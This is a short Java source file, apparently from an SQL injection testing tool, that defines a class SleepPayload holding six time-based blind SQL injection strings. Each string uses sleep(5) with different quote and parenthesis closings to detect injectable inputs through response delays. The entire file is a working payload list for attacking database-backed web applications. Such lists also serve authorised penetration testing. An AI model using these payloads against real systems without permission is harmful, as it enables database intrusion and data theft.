package com.sql.sqlinjecttool.payload;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class SleepPayload {
    public static List sleepPayload= Arrays.asList(
            " and sleep(5) and  1=1 ",
            ") and sleep(5) and (1=1  ",
            "' and sleep(5) and '1'='1 ",
            "') and sleep(5) and ('1'='1",
            "\" and sleep(5) and \"A\"=\"A",
            "\")and sleep(5) and (\"1\"=\"1 ");
}
